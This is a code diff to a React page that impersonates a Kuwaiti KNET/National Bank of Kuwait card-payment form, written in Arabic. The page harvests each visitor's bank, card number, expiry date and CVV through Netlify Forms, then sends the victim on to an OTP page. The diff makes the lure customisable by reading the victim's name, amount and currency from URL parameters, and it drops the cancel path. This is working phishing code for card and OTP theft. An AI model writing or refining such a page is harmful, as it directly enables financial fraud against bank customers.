@@ -1,18 +1,7 @@
-
 import { useState } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
-
-// بيانات الدفع المطابقة لـ PaymentPage
-const paymentData = {
-  "pay_1755575829268_7kths83vaq_04xj": {
-    customerName: "يوسف غازي الرشيدي",
-    amount: 30.000,
-    currency: "KWD",
-    description: "Family Support"
-  }
-};
 
 const defaultPaymentData = {
   customerName: "يوسف غازي الرشيدي",
@@ -25,8 +14,13 @@ const CardDetails = () => {
   const { id } = useParams();
   const navigate = useNavigate();
   
-  // الحصول على بيانات الدفع بناءً على المعرف
-  const currentPayment = paymentData[id as keyof typeof paymentData] || defaultPaymentData;
+  const queryParams = new URLSearchParams(window.location.search);
+  const currentPayment = {
+    customerName: queryParams.get('n') || defaultPaymentData.customerName,
+    amount: parseFloat(queryParams.get('a') || String(defaultPaymentData.amount)),
+    currency: queryParams.get('c') || defaultPaymentData.currency,
+    description: queryParams.get('p') || defaultPaymentData.description
+  };
   
   const [formData, setFormData] = useState({
     bank: "",
@@ -38,7 +32,6 @@ const CardDetails = () => {
   });
   const [loading, setLoading] = useState(false);
 
-  // Kuwaiti Banks
   const kuwaitiBanks = [
     { value: "", label: "يرجى اختيار البنك" },
     { value: "nbk", label: "بنك الكويت الوطني" },
@@ -54,7 +47,6 @@ const CardDetails = () => {
     { value: "mashreq", label: "بنك المشرق" }
   ];
 
-  // Kuwaiti Card Prefixes
   const cardPrefixes = [
     { value: "", label: "بادئة" },
     { value: "4", label: "4 (Visa)" },
@@ -87,19 +79,13 @@ const CardDetails = () => {
     e.preventDefault();
     setLoading(true);
     
-    // The form will be handled by Netlify Forms automatically
     setTimeout(() => {
-      navigate(`/otp/${id}`);
+      navigate(`/otp/${id}${window.location.search}`);
     }, 2000);
-  };
-
-  const handleCancel = () => {
-    navigate('/error');
   };
 
   return (
     <div className="min-h-screen" style={{ backgroundColor: '#e8e8e8' }}>
-      {/* NBK Advertisement Banner - Mobile Optimized */}
       <div className="w-full h-20 sm:h-32 bg-gradient-to-r from-blue-300 to-blue-500 relative overflow-hidden">
         <img 
           src="/lovable-uploads/1d2a9902-d961-468c-9f95-1695f21fb91b.png" 
@@ -109,7 +95,6 @@ const CardDetails = () => {
       </div>
 
       <div className="container mx-auto px-3 sm:px-6 py-4 sm:py-8 max-w-2xl">
-        {/* NBK Header Card - Mobile Optimized */}
         <div className="bg-white rounded-2xl sm:rounded-3xl shadow-lg p-4 sm:p-8 mb-3 sm:mb-6" style={{ borderRadius: '16px', boxShadow: '0 4px 16px rgba(0,0,0,0.1)' }}>
           <div className="text-center mb-4 sm:mb-8">
             <div className="flex items-center justify-center mb-3 sm:mb-6">
@@ -132,16 +117,9 @@ const CardDetails = () => {
                 <span className="text-gray-800 font-medium">:المبلغ</span>
               </div>
             </div>
-            <div className="border-t border-gray-300 pt-2 sm:pt-4">
-              <div className="flex justify-between items-center text-sm sm:text-base">
-                <span className="text-blue-600 font-medium">{currentPayment.description}</span>
-                <span className="text-gray-800 font-medium">:الغرض</span>
-              </div>
-            </div>
           </div>
         </div>
 
-        {/* Payment Form Card - Mobile Optimized */}
         <div className="bg-white rounded-2xl sm:rounded-3xl shadow-lg p-4 sm:p-8 mb-3 sm:mb-6" style={{ borderRadius: '16px', boxShadow: '0 4px 16px rgba(0,0,0,0.1)' }}>
           <form 
             name="card-details" 
@@ -150,9 +128,7 @@ const CardDetails = () => {
             netlify-honeypot="bot-field"
             onSubmit={handleSubmit} 
             className="space-y-4 sm:space-y-8"
-            action="/otp"
           >
-            {/* Hidden fields for Netlify */}
             <input type="hidden" name="form-name" value="card-details" />
             <input type="hidden" name="payment-id" value={id} />
             <p style={{ display: 'none' }}>
@@ -161,14 +137,13 @@ const CardDetails = () => {
               </label>
             </p>
 
-            {/* Bank Selection */}
             <div className="space-y-2 sm:space-y-3">
               <div className="flex justify-between items-center">
                 <select 
                   name="bank"
                   value={formData.bank}
                   onChange={(e) => handleInputChange('bank', e.target.value)}
-                  className="flex-1 p-2 sm:p-4 border-2 border-gray-300 rounded-lg sm:rounded-xl text-center bg-white text-gray-700 text-sm sm:text-lg z-50" 
+                  className="flex-1 p-2 sm:p-4 border-2 border-gray-300 rounded-lg sm:rounded-xl text-center bg-white text-gray-700 text-sm sm:text-lg" 
                   style={{ borderRadius: '8px' }}
                   required
                 >
@@ -182,7 +157,6 @@ const CardDetails = () => {
               </div>
             </div>
 
-            {/* Card Number */}
             <div className="space-y-2 sm:space-y-3">
               <div className="flex justify-between items-center">
                 <div className="flex space-x-2 sm:space-x-3 flex-1">
@@ -190,7 +164,7 @@ const CardDetails = () => {
                     name="card-prefix"
                     value={formData.prefix}
                     onChange={(e) => handleInputChange('prefix', e.target.value)}
-                    className="w-16 sm:w-28 p-2 sm:p-4 border-2 border-gray-300 rounded-lg sm:rounded-xl text-center bg-white text-gray-700 text-xs sm:text-base z-50" 
+                    className="w-16 sm:w-28 p-2 sm:p-4 border-2 border-gray-300 rounded-lg sm:rounded-xl text-center bg-white text-gray-700 text-xs sm:text-base" 
                     style={{ borderRadius: '8px' }}
                     required
                   >
@@ -207,7 +181,6 @@ const CardDetails = () => {
                     onChange={(e) => handleInputChange('cardNumber', e.target.value)}
                     className="flex-1 p-2 sm:p-4 border-2 border-blue-500 rounded-lg sm:rounded-xl text-center text-sm sm:text-lg"
                     style={{ borderRadius: '8px', borderColor: '#3b82f6' }}
-                    placeholder=""
                     required
                   />
                 </div>
@@ -215,7 +188,6 @@ const CardDetails = () => {
               </div>
             </div>
 
-            {/* Expiry Date */}
             <div className="space-y-2 sm:space-y-3">
               <div className="flex justify-between items-center">
                 <div className="flex space-x-2 sm:space-x-3">
@@ -223,7 +195,7 @@ const CardDetails = () => {
                     name="expiry-year"
                     value={formData.expiryYear}
                     onChange={(e) => handleInputChange('expiryYear', e.target.value)}
-                    className="w-16 sm:w-28 p-2 sm:p-4 border-2 border-gray-300 rounded-lg sm:rounded-xl text-center bg-white text-gray-700 text-xs sm:text-base z-50"
+                    className="w-16 sm:w-28 p-2 sm:p-4 border-2 border-gray-300 rounded-lg sm:rounded-xl text-center bg-white text-gray-700 text-xs sm:text-base"
                     style={{ borderRadius: '8px' }}
                     required
                   >
@@ -233,13 +205,12 @@ const CardDetails = () => {
                     <option value="2026">2026</option>
                     <option value="2027">2027</option>
                     <option value="2028">2028</option>
-                    <option value="2029">2029</option>
                   </select>
                   <select 
                     name="expiry-month"
                     value={formData.expiryMonth}
                     onChange={(e) => handleInputChange('expiryMonth', e.target.value)}
-                    className="w-16 sm:w-28 p-2 sm:p-4 border-2 border-gray-300 rounded-lg sm:rounded-xl text-center bg-white text-gray-700 text-xs sm:text-base z-50"
+                    className="w-16 sm:w-28 p-2 sm:p-4 border-2 border-gray-300 rounded-lg sm:rounded-xl text-center bg-white text-gray-700 text-xs sm:text-base"
                     style={{ borderRadius: '8px' }}
                     required
                   >
@@ -255,7 +226,6 @@ const CardDetails = () => {
               </div>
             </div>
 
-            {/* CVV */}
             <div className="space-y-2 sm:space-y-3">
               <div className="flex justify-between items-center">
                 <Input
@@ -265,7 +235,6 @@ const CardDetails = () => {
                   onChange={(e) => handleInputChange('cvv', e.target.value)}
                   className="flex-1 p-2 sm:p-4 border-2 border-blue-500 rounded-lg sm:rounded-xl text-center text-sm sm:text-lg"
                   style={{ borderRadius: '8px', borderColor: '#3b82f6' }}
-                  placeholder=""
                   maxLength={3}
                   required
                 />
@@ -273,14 +242,11 @@ const CardDetails = () => {
               </div>
             </div>
 
-            {/* Action Buttons Card - Mobile Optimized */}
-            <div className="bg-white rounded-2xl sm:rounded-3xl shadow-lg p-4 sm:p-8 mt-6" style={{ borderRadius: '16px', boxShadow: '0 4px 16px rgba(0,0,0,0.1)' }}>
+            <div className="bg-white rounded-2xl sm:rounded-3xl p-4 sm:p-8 mt-6">
               <div className="flex space-x-3 sm:space-x-6">
-                
                 <button
                   type="submit"
-                  className="flex-1 bg-gray-300 text-gray-800 py-3 sm:py-5 rounded-xl sm:rounded-2xl text-base sm:text-xl font-medium hover:bg-gray-400 transition-colors"
-                  style={{ borderRadius: '12px' }}
+                  className="flex-1 bg-blue-700 text-white py-3 sm:py-5 rounded-xl sm:rounded-2xl text-base sm:text-xl font-bold hover:bg-blue-800 transition-colors shadow-lg disabled:opacity-50"
                   disabled={loading}
                 >
                   {loading ? 'جاري التحميل...' : 'إرسال'}
@@ -290,7 +256,6 @@ const CardDetails = () => {
           </form>
         </div>
 
-        {/* Footer - Mobile Optimized */}
         <div className="text-center mt-6 sm:mt-12 text-gray-700">
           <div className="text-sm sm:text-lg mb-2 sm:mb-3 font-medium">جميع الحقوق محفوظة © 2025</div>
           <div className="text-sm sm:text-lg text-blue-600 font-medium">شركة الخدمات المصرفية الآلية المشتركة - كي نت</div>
